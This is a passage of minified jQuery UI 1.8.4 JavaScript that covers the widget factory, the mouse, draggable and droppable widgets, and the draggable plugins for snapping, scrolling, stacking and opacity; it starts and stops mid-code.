CONTROL:17,DELETE:46,DOWN:40,END:35,ENTER:13,ESCAPE:27,HOME:36,INSERT:45,LEFT:37,MENU:93,NUMPAD_ADD:107,NUMPAD_DECIMAL:110,NUMPAD_DIVIDE:111,NUMPAD_ENTER:108,NUMPAD_MULTIPLY:106,NUMPAD_SUBTRACT:109,PAGE_DOWN:34,PAGE_UP:33,PERIOD:190,RIGHT:39,SHIFT:16,SPACE:32,TAB:9,UP:38,WINDOWS:91}});c.fn.extend({_focus:c.fn.focus,focus:function(a,b){return typeof a==="number"?this.each(function(){var d=this;setTimeout(function(){c(d).focus();b&&b.call(d)},a)}):this._focus.apply(this,arguments)},enableSelection:function(){return this.attr("unselectable",
"off").css("MozUserSelect","")},disableSelection:function(){return this.attr("unselectable","on").css("MozUserSelect","none")},scrollParent:function(){var a;a=c.browser.msie&&/(static|relative)/.test(this.css("position"))||/absolute/.test(this.css("position"))?this.parents().filter(function(){return/(relative|absolute|fixed)/.test(c.curCSS(this,"position",1))&&/(auto|scroll)/.test(c.curCSS(this,"overflow",1)+c.curCSS(this,"overflow-y",1)+c.curCSS(this,"overflow-x",1))}).eq(0):this.parents().filter(function(){return/(auto|scroll)/.test(c.curCSS(this,
"overflow",1)+c.curCSS(this,"overflow-y",1)+c.curCSS(this,"overflow-x",1))}).eq(0);return/fixed/.test(this.css("position"))||!a.length?c(document):a},zIndex:function(a){if(a!==j)return this.css("zIndex",a);if(this.length){a=c(this[0]);for(var b;a.length&&a[0]!==document;){b=a.css("position");if(b==="absolute"||b==="relative"||b==="fixed"){b=parseInt(a.css("zIndex"));if(!isNaN(b)&&b!=0)return b}a=a.parent()}}return 0}});c.each(["Width","Height"],function(a,b){function d(f,g,l,m){c.each(e,function(){g-=
parseFloat(c.curCSS(f,"padding"+this,true))||0;if(l)g-=parseFloat(c.curCSS(f,"border"+this+"Width",true))||0;if(m)g-=parseFloat(c.curCSS(f,"margin"+this,true))||0});return g}var e=b==="Width"?["Left","Right"]:["Top","Bottom"],h=b.toLowerCase(),i={innerWidth:c.fn.innerWidth,innerHeight:c.fn.innerHeight,outerWidth:c.fn.outerWidth,outerHeight:c.fn.outerHeight};c.fn["inner"+b]=function(f){if(f===j)return i["inner"+b].call(this);return this.each(function(){c.style(this,h,d(this,f)+"px")})};c.fn["outer"+
b]=function(f,g){if(typeof f!=="number")return i["outer"+b].call(this,f);return this.each(function(){c.style(this,h,d(this,f,true,g)+"px")})}});c.extend(c.expr[":"],{data:function(a,b,d){return!!c.data(a,d[3])},focusable:function(a){var b=a.nodeName.toLowerCase(),d=c.attr(a,"tabindex");if("area"===b){b=a.parentNode;d=b.name;if(!a.href||!d||b.nodeName.toLowerCase()!=="map")return false;a=c("img[usemap=#"+d+"]")[0];return!!a&&k(a)}return(/input|select|textarea|button|object/.test(b)?!a.disabled:"a"==
b?a.href||!isNaN(d):!isNaN(d))&&k(a)},tabbable:function(a){var b=c.attr(a,"tabindex");return(isNaN(b)||b>=0)&&c(a).is(":focusable")}})}})(jQuery);
(function(b,j){var k=b.fn.remove;b.fn.remove=function(a,c){return this.each(function(){if(!c)if(!a||b.filter(a,[this]).length)b("*",this).add([this]).each(function(){b(this).triggerHandler("remove")});return k.call(b(this),a,c)})};b.widget=function(a,c,d){var e=a.split(".")[0],f;a=a.split(".")[1];f=e+"-"+a;if(!d){d=c;c=b.Widget}b.expr[":"][f]=function(h){return!!b.data(h,a)};b[e]=b[e]||{};b[e][a]=function(h,g){arguments.length&&this._createWidget(h,g)};c=new c;c.options=b.extend(true,{},c.options);
b[e][a].prototype=b.extend(true,c,{namespace:e,widgetName:a,widgetEventPrefix:b[e][a].prototype.widgetEventPrefix||a,widgetBaseClass:f},d);b.widget.bridge(a,b[e][a])};b.widget.bridge=function(a,c){b.fn[a]=function(d){var e=typeof d==="string",f=Array.prototype.slice.call(arguments,1),h=this;d=!e&&f.length?b.extend.apply(null,[true,d].concat(f)):d;if(e&&d.substring(0,1)==="_")return h;e?this.each(function(){var g=b.data(this,a),i=g&&b.isFunction(g[d])?g[d].apply(g,f):g;if(i!==g&&i!==j){h=i;return false}}):
this.each(function(){var g=b.data(this,a);if(g){d&&g.option(d);g._init()}else b.data(this,a,new c(d,this))});return h}};b.Widget=function(a,c){arguments.length&&this._createWidget(a,c)};b.Widget.prototype={widgetName:"widget",widgetEventPrefix:"",options:{disabled:false},_createWidget:function(a,c){b.data(c,this.widgetName,this);this.element=b(c);this.options=b.extend(true,{},this.options,b.metadata&&b.metadata.get(c)[this.widgetName],a);var d=this;this.element.bind("remove."+this.widgetName,function(){d.destroy()});
this._create();this._init()},_create:function(){},_init:function(){},destroy:function(){this.element.unbind("."+this.widgetName).removeData(this.widgetName);this.widget().unbind("."+this.widgetName).removeAttr("aria-disabled").removeClass(this.widgetBaseClass+"-disabled ui-state-disabled")},widget:function(){return this.element},option:function(a,c){var d=a,e=this;if(arguments.length===0)return b.extend({},e.options);if(typeof a==="string"){if(c===j)return this.options[a];d={};d[a]=c}b.each(d,function(f,
h){e._setOption(f,h)});return e},_setOption:function(a,c){this.options[a]=c;if(a==="disabled")this.widget()[c?"addClass":"removeClass"](this.widgetBaseClass+"-disabled ui-state-disabled").attr("aria-disabled",c);return this},enable:function(){return this._setOption("disabled",false)},disable:function(){return this._setOption("disabled",true)},_trigger:function(a,c,d){var e=this.options[a];c=b.Event(c);c.type=(a===this.widgetEventPrefix?a:this.widgetEventPrefix+a).toLowerCase();d=d||{};if(c.originalEvent){a=
b.event.props.length;for(var f;a;){f=b.event.props[--a];c[f]=c.originalEvent[f]}}this.element.trigger(c,d);return!(b.isFunction(e)&&e.call(this.element[0],c,d)===false||c.isDefaultPrevented())}}})(jQuery);
(function(c){c.widget("ui.mouse",{options:{cancel:":input,option",distance:1,delay:0},_mouseInit:function(){var a=this;this.element.bind("mousedown."+this.widgetName,function(b){return a._mouseDown(b)}).bind("click."+this.widgetName,function(b){if(a._preventClickEvent){a._preventClickEvent=false;b.stopImmediatePropagation();return false}});this.started=false},_mouseDestroy:function(){this.element.unbind("."+this.widgetName)},_mouseDown:function(a){a.originalEvent=a.originalEvent||{};if(!a.originalEvent.mouseHandled){this._mouseStarted&&
this._mouseUp(a);this._mouseDownEvent=a;var b=this,e=a.which==1,f=typeof this.options.cancel=="string"?c(a.target).parents().add(a.target).filter(this.options.cancel).length:false;if(!e||f||!this._mouseCapture(a))return true;this.mouseDelayMet=!this.options.delay;if(!this.mouseDelayMet)this._mouseDelayTimer=setTimeout(function(){b.mouseDelayMet=true},this.options.delay);if(this._mouseDistanceMet(a)&&this._mouseDelayMet(a)){this._mouseStarted=this._mouseStart(a)!==false;if(!this._mouseStarted){a.preventDefault();
return true}}this._mouseMoveDelegate=function(d){return b._mouseMove(d)};this._mouseUpDelegate=function(d){return b._mouseUp(d)};c(document).bind("mousemove."+this.widgetName,this._mouseMoveDelegate).bind("mouseup."+this.widgetName,this._mouseUpDelegate);c.browser.safari||a.preventDefault();return a.originalEvent.mouseHandled=true}},_mouseMove:function(a){if(c.browser.msie&&!a.button)return this._mouseUp(a);if(this._mouseStarted){this._mouseDrag(a);return a.preventDefault()}if(this._mouseDistanceMet(a)&&
this._mouseDelayMet(a))(this._mouseStarted=this._mouseStart(this._mouseDownEvent,a)!==false)?this._mouseDrag(a):this._mouseUp(a);return!this._mouseStarted},_mouseUp:function(a){c(document).unbind("mousemove."+this.widgetName,this._mouseMoveDelegate).unbind("mouseup."+this.widgetName,this._mouseUpDelegate);if(this._mouseStarted){this._mouseStarted=false;this._preventClickEvent=a.target==this._mouseDownEvent.target;this._mouseStop(a)}return false},_mouseDistanceMet:function(a){return Math.max(Math.abs(this._mouseDownEvent.pageX-
a.pageX),Math.abs(this._mouseDownEvent.pageY-a.pageY))>=this.options.distance},_mouseDelayMet:function(){return this.mouseDelayMet},_mouseStart:function(){},_mouseDrag:function(){},_mouseStop:function(){},_mouseCapture:function(){return true}})})(jQuery);
(function(d){d.widget("ui.draggable",d.ui.mouse,{widgetEventPrefix:"drag",options:{addClasses:true,appendTo:"parent",axis:false,connectToSortable:false,containment:false,cursor:"auto",cursorAt:false,grid:false,handle:false,helper:"original",iframeFix:false,opacity:false,refreshPositions:false,revert:false,revertDuration:500,scope:"default",scroll:true,scrollSensitivity:20,scrollSpeed:20,snap:false,snapMode:"both",snapTolerance:20,stack:false,zIndex:false},_create:function(){if(this.options.helper==
"original"&&!/^(?:r|a|f)/.test(this.element.css("position")))this.element[0].style.position="relative";this.options.addClasses&&this.element.addClass("ui-draggable");this.options.disabled&&this.element.addClass("ui-draggable-disabled");this._mouseInit()},destroy:function(){if(this.element.data("draggable")){this.element.removeData("draggable").unbind(".draggable").removeClass("ui-draggable ui-draggable-dragging ui-draggable-disabled");this._mouseDestroy();return this}},_mouseCapture:function(a){var b=
this.options;if(this.helper||b.disabled||d(a.target).is(".ui-resizable-handle"))return false;this.handle=this._getHandle(a);if(!this.handle)return false;return true},_mouseStart:function(a){var b=this.options;this.helper=this._createHelper(a);this._cacheHelperProportions();if(d.ui.ddmanager)d.ui.ddmanager.current=this;this._cacheMargins();this.cssPosition=this.helper.css("position");this.scrollParent=this.helper.scrollParent();this.offset=this.positionAbs=this.element.offset();this.offset={top:this.offset.top-
this.margins.top,left:this.offset.left-this.margins.left};d.extend(this.offset,{click:{left:a.pageX-this.offset.left,top:a.pageY-this.offset.top},parent:this._getParentOffset(),relative:this._getRelativeOffset()});this.originalPosition=this.position=this._generatePosition(a);this.originalPageX=a.pageX;this.originalPageY=a.pageY;b.cursorAt&&this._adjustOffsetFromHelper(b.cursorAt);b.containment&&this._setContainment();if(this._trigger("start",a)===false){this._clear();return false}this._cacheHelperProportions();
d.ui.ddmanager&&!b.dropBehaviour&&d.ui.ddmanager.prepareOffsets(this,a);this.helper.addClass("ui-draggable-dragging");this._mouseDrag(a,true);return true},_mouseDrag:function(a,b){this.position=this._generatePosition(a);this.positionAbs=this._convertPositionTo("absolute");if(!b){b=this._uiHash();if(this._trigger("drag",a,b)===false){this._mouseUp({});return false}this.position=b.position}if(!this.options.axis||this.options.axis!="y")this.helper[0].style.left=this.position.left+"px";if(!this.options.axis||
this.options.axis!="x")this.helper[0].style.top=this.position.top+"px";d.ui.ddmanager&&d.ui.ddmanager.drag(this,a);return false},_mouseStop:function(a){var b=false;if(d.ui.ddmanager&&!this.options.dropBehaviour)b=d.ui.ddmanager.drop(this,a);if(this.dropped){b=this.dropped;this.dropped=false}if(!this.element[0]||!this.element[0].parentNode)return false;if(this.options.revert=="invalid"&&!b||this.options.revert=="valid"&&b||this.options.revert===true||d.isFunction(this.options.revert)&&this.options.revert.call(this.element,
b)){var c=this;d(this.helper).animate(this.originalPosition,parseInt(this.options.revertDuration,10),function(){c._trigger("stop",a)!==false&&c._clear()})}else this._trigger("stop",a)!==false&&this._clear();return false},cancel:function(){this.helper.is(".ui-draggable-dragging")?this._mouseUp({}):this._clear();return this},_getHandle:function(a){var b=!this.options.handle||!d(this.options.handle,this.element).length?true:false;d(this.options.handle,this.element).find("*").andSelf().each(function(){if(this==
a.target)b=true});return b},_createHelper:function(a){var b=this.options;a=d.isFunction(b.helper)?d(b.helper.apply(this.element[0],[a])):b.helper=="clone"?this.element.clone():this.element;a.parents("body").length||a.appendTo(b.appendTo=="parent"?this.element[0].parentNode:b.appendTo);a[0]!=this.element[0]&&!/(fixed|absolute)/.test(a.css("position"))&&a.css("position","absolute");return a},_adjustOffsetFromHelper:function(a){if(typeof a=="string")a=a.split(" ");if(d.isArray(a))a={left:+a[0],top:+a[1]||
0};if("left"in a)this.offset.click.left=a.left+this.margins.left;if("right"in a)this.offset.click.left=this.helperProportions.width-a.right+this.margins.left;if("top"in a)this.offset.click.top=a.top+this.margins.top;if("bottom"in a)this.offset.click.top=this.helperProportions.height-a.bottom+this.margins.top},_getParentOffset:function(){this.offsetParent=this.helper.offsetParent();var a=this.offsetParent.offset();if(this.cssPosition=="absolute"&&this.scrollParent[0]!=document&&d.ui.contains(this.scrollParent[0],
this.offsetParent[0])){a.left+=this.scrollParent.scrollLeft();a.top+=this.scrollParent.scrollTop()}if(this.offsetParent[0]==document.body||this.offsetParent[0].tagName&&this.offsetParent[0].tagName.toLowerCase()=="html"&&d.browser.msie)a={top:0,left:0};return{top:a.top+(parseInt(this.offsetParent.css("borderTopWidth"),10)||0),left:a.left+(parseInt(this.offsetParent.css("borderLeftWidth"),10)||0)}},_getRelativeOffset:function(){if(this.cssPosition=="relative"){var a=this.element.position();return{top:a.top-
(parseInt(this.helper.css("top"),10)||0)+this.scrollParent.scrollTop(),left:a.left-(parseInt(this.helper.css("left"),10)||0)+this.scrollParent.scrollLeft()}}else return{top:0,left:0}},_cacheMargins:function(){this.margins={left:parseInt(this.element.css("marginLeft"),10)||0,top:parseInt(this.element.css("marginTop"),10)||0}},_cacheHelperProportions:function(){this.helperProportions={width:this.helper.outerWidth(),height:this.helper.outerHeight()}},_setContainment:function(){var a=this.options;if(a.containment==
"parent")a.containment=this.helper[0].parentNode;if(a.containment=="document"||a.containment=="window")this.containment=[0-this.offset.relative.left-this.offset.parent.left,0-this.offset.relative.top-this.offset.parent.top,d(a.containment=="document"?document:window).width()-this.helperProportions.width-this.margins.left,(d(a.containment=="document"?document:window).height()||document.body.parentNode.scrollHeight)-this.helperProportions.height-this.margins.top];if(!/^(document|window|parent)$/.test(a.containment)&&
a.containment.constructor!=Array){var b=d(a.containment)[0];if(b){a=d(a.containment).offset();var c=d(b).css("overflow")!="hidden";this.containment=[a.left+(parseInt(d(b).css("borderLeftWidth"),10)||0)+(parseInt(d(b).css("paddingLeft"),10)||0)-this.margins.left,a.top+(parseInt(d(b).css("borderTopWidth"),10)||0)+(parseInt(d(b).css("paddingTop"),10)||0)-this.margins.top,a.left+(c?Math.max(b.scrollWidth,b.offsetWidth):b.offsetWidth)-(parseInt(d(b).css("borderLeftWidth"),10)||0)-(parseInt(d(b).css("paddingRight"),
10)||0)-this.helperProportions.width-this.margins.left,a.top+(c?Math.max(b.scrollHeight,b.offsetHeight):b.offsetHeight)-(parseInt(d(b).css("borderTopWidth"),10)||0)-(parseInt(d(b).css("paddingBottom"),10)||0)-this.helperProportions.height-this.margins.top]}}else if(a.containment.constructor==Array)this.containment=a.containment},_convertPositionTo:function(a,b){if(!b)b=this.position;a=a=="absolute"?1:-1;var c=this.cssPosition=="absolute"&&!(this.scrollParent[0]!=document&&d.ui.contains(this.scrollParent[0],
this.offsetParent[0]))?this.offsetParent:this.scrollParent,f=/(html|body)/i.test(c[0].tagName);return{top:b.top+this.offset.relative.top*a+this.offset.parent.top*a-(d.browser.safari&&d.browser.version<526&&this.cssPosition=="fixed"?0:(this.cssPosition=="fixed"?-this.scrollParent.scrollTop():f?0:c.scrollTop())*a),left:b.left+this.offset.relative.left*a+this.offset.parent.left*a-(d.browser.safari&&d.browser.version<526&&this.cssPosition=="fixed"?0:(this.cssPosition=="fixed"?-this.scrollParent.scrollLeft():
f?0:c.scrollLeft())*a)}},_generatePosition:function(a){var b=this.options,c=this.cssPosition=="absolute"&&!(this.scrollParent[0]!=document&&d.ui.contains(this.scrollParent[0],this.offsetParent[0]))?this.offsetParent:this.scrollParent,f=/(html|body)/i.test(c[0].tagName),e=a.pageX,g=a.pageY;if(this.originalPosition){if(this.containment){if(a.pageX-this.offset.click.left<this.containment[0])e=this.containment[0]+this.offset.click.left;if(a.pageY-this.offset.click.top<this.containment[1])g=this.containment[1]+
this.offset.click.top;if(a.pageX-this.offset.click.left>this.containment[2])e=this.containment[2]+this.offset.click.left;if(a.pageY-this.offset.click.top>this.containment[3])g=this.containment[3]+this.offset.click.top}if(b.grid){g=this.originalPageY+Math.round((g-this.originalPageY)/b.grid[1])*b.grid[1];g=this.containment?!(g-this.offset.click.top<this.containment[1]||g-this.offset.click.top>this.containment[3])?g:!(g-this.offset.click.top<this.containment[1])?g-b.grid[1]:g+b.grid[1]:g;e=this.originalPageX+
Math.round((e-this.originalPageX)/b.grid[0])*b.grid[0];e=this.containment?!(e-this.offset.click.left<this.containment[0]||e-this.offset.click.left>this.containment[2])?e:!(e-this.offset.click.left<this.containment[0])?e-b.grid[0]:e+b.grid[0]:e}}return{top:g-this.offset.click.top-this.offset.relative.top-this.offset.parent.top+(d.browser.safari&&d.browser.version<526&&this.cssPosition=="fixed"?0:this.cssPosition=="fixed"?-this.scrollParent.scrollTop():f?0:c.scrollTop()),left:e-this.offset.click.left-
this.offset.relative.left-this.offset.parent.left+(d.browser.safari&&d.browser.version<526&&this.cssPosition=="fixed"?0:this.cssPosition=="fixed"?-this.scrollParent.scrollLeft():f?0:c.scrollLeft())}},_clear:function(){this.helper.removeClass("ui-draggable-dragging");this.helper[0]!=this.element[0]&&!this.cancelHelperRemoval&&this.helper.remove();this.helper=null;this.cancelHelperRemoval=false},_trigger:function(a,b,c){c=c||this._uiHash();d.ui.plugin.call(this,a,[b,c]);if(a=="drag")this.positionAbs=
this._convertPositionTo("absolute");return d.Widget.prototype._trigger.call(this,a,b,c)},plugins:{},_uiHash:function(){return{helper:this.helper,position:this.position,originalPosition:this.originalPosition,offset:this.positionAbs}}});d.extend(d.ui.draggable,{version:"1.8.4"});d.ui.plugin.add("draggable","connectToSortable",{start:function(a,b){var c=d(this).data("draggable"),f=c.options,e=d.extend({},b,{item:c.element});c.sortables=[];d(f.connectToSortable).each(function(){var g=d.data(this,"sortable");
if(g&&!g.options.disabled){c.sortables.push({instance:g,shouldRevert:g.options.revert});g._refreshItems();g._trigger("activate",a,e)}})},stop:function(a,b){var c=d(this).data("draggable"),f=d.extend({},b,{item:c.element});d.each(c.sortables,function(){if(this.instance.isOver){this.instance.isOver=0;c.cancelHelperRemoval=true;this.instance.cancelHelperRemoval=false;if(this.shouldRevert)this.instance.options.revert=true;this.instance._mouseStop(a);this.instance.options.helper=this.instance.options._helper;
c.options.helper=="original"&&this.instance.currentItem.css({top:"auto",left:"auto"})}else{this.instance.cancelHelperRemoval=false;this.instance._trigger("deactivate",a,f)}})},drag:function(a,b){var c=d(this).data("draggable"),f=this;d.each(c.sortables,function(){this.instance.positionAbs=c.positionAbs;this.instance.helperProportions=c.helperProportions;this.instance.offset.click=c.offset.click;if(this.instance._intersectsWith(this.instance.containerCache)){if(!this.instance.isOver){this.instance.isOver=
1;this.instance.currentItem=d(f).clone().appendTo(this.instance.element).data("sortable-item",true);this.instance.options._helper=this.instance.options.helper;this.instance.options.helper=function(){return b.helper[0]};a.target=this.instance.currentItem[0];this.instance._mouseCapture(a,true);this.instance._mouseStart(a,true,true);this.instance.offset.click.top=c.offset.click.top;this.instance.offset.click.left=c.offset.click.left;this.instance.offset.parent.left-=c.offset.parent.left-this.instance.offset.parent.left;
this.instance.offset.parent.top-=c.offset.parent.top-this.instance.offset.parent.top;c._trigger("toSortable",a);c.dropped=this.instance.element;c.currentItem=c.element;this.instance.fromOutside=c}this.instance.currentItem&&this.instance._mouseDrag(a)}else if(this.instance.isOver){this.instance.isOver=0;this.instance.cancelHelperRemoval=true;this.instance.options.revert=false;this.instance._trigger("out",a,this.instance._uiHash(this.instance));this.instance._mouseStop(a,true);this.instance.options.helper=
this.instance.options._helper;this.instance.currentItem.remove();this.instance.placeholder&&this.instance.placeholder.remove();c._trigger("fromSortable",a);c.dropped=false}})}});d.ui.plugin.add("draggable","cursor",{start:function(){var a=d("body"),b=d(this).data("draggable").options;if(a.css("cursor"))b._cursor=a.css("cursor");a.css("cursor",b.cursor)},stop:function(){var a=d(this).data("draggable").options;a._cursor&&d("body").css("cursor",a._cursor)}});d.ui.plugin.add("draggable","iframeFix",{start:function(){var a=
d(this).data("draggable").options;d(a.iframeFix===true?"iframe":a.iframeFix).each(function(){d('<div class="ui-draggable-iframeFix" style="background: #fff;"></div>').css({width:this.offsetWidth+"px",height:this.offsetHeight+"px",position:"absolute",opacity:"0.001",zIndex:1E3}).css(d(this).offset()).appendTo("body")})},stop:function(){d("div.ui-draggable-iframeFix").each(function(){this.parentNode.removeChild(this)})}});d.ui.plugin.add("draggable","opacity",{start:function(a,b){a=d(b.helper);b=d(this).data("draggable").options;
if(a.css("opacity"))b._opacity=a.css("opacity");a.css("opacity",b.opacity)},stop:function(a,b){a=d(this).data("draggable").options;a._opacity&&d(b.helper).css("opacity",a._opacity)}});d.ui.plugin.add("draggable","scroll",{start:function(){var a=d(this).data("draggable");if(a.scrollParent[0]!=document&&a.scrollParent[0].tagName!="HTML")a.overflowOffset=a.scrollParent.offset()},drag:function(a){var b=d(this).data("draggable"),c=b.options,f=false;if(b.scrollParent[0]!=document&&b.scrollParent[0].tagName!=
"HTML"){if(!c.axis||c.axis!="x")if(b.overflowOffset.top+b.scrollParent[0].offsetHeight-a.pageY<c.scrollSensitivity)b.scrollParent[0].scrollTop=f=b.scrollParent[0].scrollTop+c.scrollSpeed;else if(a.pageY-b.overflowOffset.top<c.scrollSensitivity)b.scrollParent[0].scrollTop=f=b.scrollParent[0].scrollTop-c.scrollSpeed;if(!c.axis||c.axis!="y")if(b.overflowOffset.left+b.scrollParent[0].offsetWidth-a.pageX<c.scrollSensitivity)b.scrollParent[0].scrollLeft=f=b.scrollParent[0].scrollLeft+c.scrollSpeed;else if(a.pageX-
b.overflowOffset.left<c.scrollSensitivity)b.scrollParent[0].scrollLeft=f=b.scrollParent[0].scrollLeft-c.scrollSpeed}else{if(!c.axis||c.axis!="x")if(a.pageY-d(document).scrollTop()<c.scrollSensitivity)f=d(document).scrollTop(d(document).scrollTop()-c.scrollSpeed);else if(d(window).height()-(a.pageY-d(document).scrollTop())<c.scrollSensitivity)f=d(document).scrollTop(d(document).scrollTop()+c.scrollSpeed);if(!c.axis||c.axis!="y")if(a.pageX-d(document).scrollLeft()<c.scrollSensitivity)f=d(document).scrollLeft(d(document).scrollLeft()-
c.scrollSpeed);else if(d(window).width()-(a.pageX-d(document).scrollLeft())<c.scrollSensitivity)f=d(document).scrollLeft(d(document).scrollLeft()+c.scrollSpeed)}f!==false&&d.ui.ddmanager&&!c.dropBehaviour&&d.ui.ddmanager.prepareOffsets(b,a)}});d.ui.plugin.add("draggable","snap",{start:function(){var a=d(this).data("draggable"),b=a.options;a.snapElements=[];d(b.snap.constructor!=String?b.snap.items||":data(draggable)":b.snap).each(function(){var c=d(this),f=c.offset();this!=a.element[0]&&a.snapElements.push({item:this,
width:c.outerWidth(),height:c.outerHeight(),top:f.top,left:f.left})})},drag:function(a,b){for(var c=d(this).data("draggable"),f=c.options,e=f.snapTolerance,g=b.offset.left,n=g+c.helperProportions.width,m=b.offset.top,o=m+c.helperProportions.height,h=c.snapElements.length-1;h>=0;h--){var i=c.snapElements[h].left,k=i+c.snapElements[h].width,j=c.snapElements[h].top,l=j+c.snapElements[h].height;if(i-e<g&&g<k+e&&j-e<m&&m<l+e||i-e<g&&g<k+e&&j-e<o&&o<l+e||i-e<n&&n<k+e&&j-e<m&&m<l+e||i-e<n&&n<k+e&&j-e<o&&
o<l+e){if(f.snapMode!="inner"){var p=Math.abs(j-o)<=e,q=Math.abs(l-m)<=e,r=Math.abs(i-n)<=e,s=Math.abs(k-g)<=e;if(p)b.position.top=c._convertPositionTo("relative",{top:j-c.helperProportions.height,left:0}).top-c.margins.top;if(q)b.position.top=c._convertPositionTo("relative",{top:l,left:0}).top-c.margins.top;if(r)b.position.left=c._convertPositionTo("relative",{top:0,left:i-c.helperProportions.width}).left-c.margins.left;if(s)b.position.left=c._convertPositionTo("relative",{top:0,left:k}).left-c.margins.left}var t=
p||q||r||s;if(f.snapMode!="outer"){p=Math.abs(j-m)<=e;q=Math.abs(l-o)<=e;r=Math.abs(i-g)<=e;s=Math.abs(k-n)<=e;if(p)b.position.top=c._convertPositionTo("relative",{top:j,left:0}).top-c.margins.top;if(q)b.position.top=c._convertPositionTo("relative",{top:l-c.helperProportions.height,left:0}).top-c.margins.top;if(r)b.position.left=c._convertPositionTo("relative",{top:0,left:i}).left-c.margins.left;if(s)b.position.left=c._convertPositionTo("relative",{top:0,left:k-c.helperProportions.width}).left-c.margins.left}if(!c.snapElements[h].snapping&&
(p||q||r||s||t))c.options.snap.snap&&c.options.snap.snap.call(c.element,a,d.extend(c._uiHash(),{snapItem:c.snapElements[h].item}));c.snapElements[h].snapping=p||q||r||s||t}else{c.snapElements[h].snapping&&c.options.snap.release&&c.options.snap.release.call(c.element,a,d.extend(c._uiHash(),{snapItem:c.snapElements[h].item}));c.snapElements[h].snapping=false}}}});d.ui.plugin.add("draggable","stack",{start:function(){var a=d(this).data("draggable").options;a=d.makeArray(d(a.stack)).sort(function(c,f){return(parseInt(d(c).css("zIndex"),
10)||0)-(parseInt(d(f).css("zIndex"),10)||0)});if(a.length){var b=parseInt(a[0].style.zIndex)||0;d(a).each(function(c){this.style.zIndex=b+c});this[0].style.zIndex=b+a.length}}});d.ui.plugin.add("draggable","zIndex",{start:function(a,b){a=d(b.helper);b=d(this).data("draggable").options;if(a.css("zIndex"))b._zIndex=a.css("zIndex");a.css("zIndex",b.zIndex)},stop:function(a,b){a=d(this).data("draggable").options;a._zIndex&&d(b.helper).css("zIndex",a._zIndex)}})})(jQuery);
(function(d){d.widget("ui.droppable",{widgetEventPrefix:"drop",options:{accept:"*",activeClass:false,addClasses:true,greedy:false,hoverClass:false,scope:"default",tolerance:"intersect"},_create:function(){var a=this.options,b=a.accept;this.isover=0;this.isout=1;this.accept=d.isFunction(b)?b:function(c){return c.is(b)};this.proportions={width:this.element[0].offsetWidth,height:this.element[0].offsetHeight};d.ui.ddmanager.droppables[a.scope]=d.ui.ddmanager.droppables[a.scope]||[];d.ui.ddmanager.droppables[a.scope].push(this);
a.addClasses&&this.element.addClass("ui-droppable")},destroy:function(){for(var a=d.ui.ddmanager.droppables[this.options.scope],b=0;b<a.length;b++)a[b]==this&&a.splice(b,1);this.element.removeClass("ui-droppable ui-droppable-disabled").removeData("droppable").unbind(".droppable");return this},_setOption:function(a,b){if(a=="accept")this.accept=d.isFunction(b)?b:function(c){return c.is(b)};d.Widget.prototype._setOption.apply(this,arguments)},_activate:function(a){var b=d.ui.ddmanager.current;this.options.activeClass&&
this.element.addClass(this.options.activeClass);b&&this._trigger("activate",a,this.ui(b))},_deactivate:function(a){var b=d.ui.ddmanager.current;this.options.activeClass&&this.element.removeClass(this.options.activeClass);b&&this._trigger("deactivate",a,this.ui(b))},_over:function(a){var b=d.ui.ddmanager.current;if(!(!b||(b.currentItem||b.element)[0]==this.element[0]))if(this.accept.call(this.element[0],b.currentItem||b.element)){this.options.hoverClass&&this.element.addClass(this.options.hoverClass);
this._trigger("over",a,this.ui(b))}},_out:function(a){var b=d.ui.ddmanager.current;if(!(!b||(b.currentItem||b.element)[0]==this.element[0]))if(this.accept.call(this.element[0],b.currentItem||b.element)){this.options.hoverClass&&this.element.removeClass(this.options.hoverClass);this._trigger("out",a,this.ui(b))}},_drop:function(a,b){var c=b||d.ui.ddmanager.current;if(!c||(c.currentItem||c.element)[0]==this.element[0])return false;var e=false;this.element.find(":data(droppable)").not(".ui-draggable-dragging").each(function(){var g=
d.data(this,"droppable");if(g.options.greedy&&!g.options.disabled&&g.options.scope==c.options.scope&&g.accept.call(g.element[0],c.currentItem||c.element)&&d.ui.intersect(c,d.extend(g,{offset:g.element.offset()}),g.options.tolerance)){e=true;return false}});if(e)return false;if(this.accept.call(this.element[0],c.currentItem||c.element)){this.options.activeClass&&this.element.removeClass(this.options.activeClass);this.options.hoverClass&&this.element.removeClass(this.options.hoverClass);this._trigger("drop",
a,this.ui(c));return this.element}return false},ui:function(a){return{draggable:a.currentItem||a.element,helper:a.helper,position:a.position,offset:a.positionAbs}}});d.extend(d.ui.droppable,{version:"1.8.4"});d.ui.intersect=function(a,b,c){if(!b.offset)return false;var e=(a.positionAbs||a.position.absolute).left,g=e+a.helperProportions.width,f=(a.positionAbs||a.position.absolute).top,h=f+a.helperProportions.height,i=b.offset.left,k=i+b.proportions.width,j=b.offset.top,l=j+b.proportions.height;
switch(c){case "fit":return i<=e&&g<=k&&j<=f&&h<=l;case "intersect":return i<e+a.helperProportions.width/2&&g-a.helperProportions.width/2<k&&j<f+a.helperProportions.height/2&&h-a.helperProportions.height/2<l;case "pointer":return d.ui.isOver((a.positionAbs||a.position.absolute).top+(a.clickOffset||a.offset.click).top,(a.positionAbs||a.position.absolute).left+(a.clickOffset||a.offset.click).left,j,i,b.proportions.height,b.proportions.width);case "touch":return(f>=j&&f<=l||h>=j&&h<=l||f<j&&h>l)&&(e>=
i&&e<=k||g>=i&&g<=k||e<i&&g>k);default:return false}};d.ui.ddmanager={current:null,droppables:{"default":[]},prepareOffsets:function(a,b){var c=d.ui.ddmanager.droppables[a.options.scope]||[],e=b?b.type:null,g=(a.currentItem||a.element).find(":data(droppable)").andSelf(),f=0;a:for(;f<c.length;f++)if(!(c[f].options.disabled||a&&!c[f].accept.call(c[f].element[0],a.currentItem||a.element))){for(var h=0;h<g.length;h++)if(g[h]==c[f].element[0]){c[f].proportions.height=0;continue a}c[f].visible=c[f].element.css("display")!=
"none";if(c[f].visible){c[f].offset=c[f].element.offset();c[f].proportions={width:c[f].element[0].offsetWidth,height:c[f].element[0].offsetHeight};e=="mousedown"&&c[f]._activate.call(c[f],b)}}},drop:function(a,b){var c=false;d.each(d.ui.ddmanager.droppables[a.options.scope]||[],function(){if(this.options){if(!this.options.disabled&&this.visible&&d.ui.intersect(a,this,this.options.tolerance))c=c||this._drop.call(this,b);if(!this.options.disabled&&this.visible&&this.accept.call(this.element[0],a.currentItem||
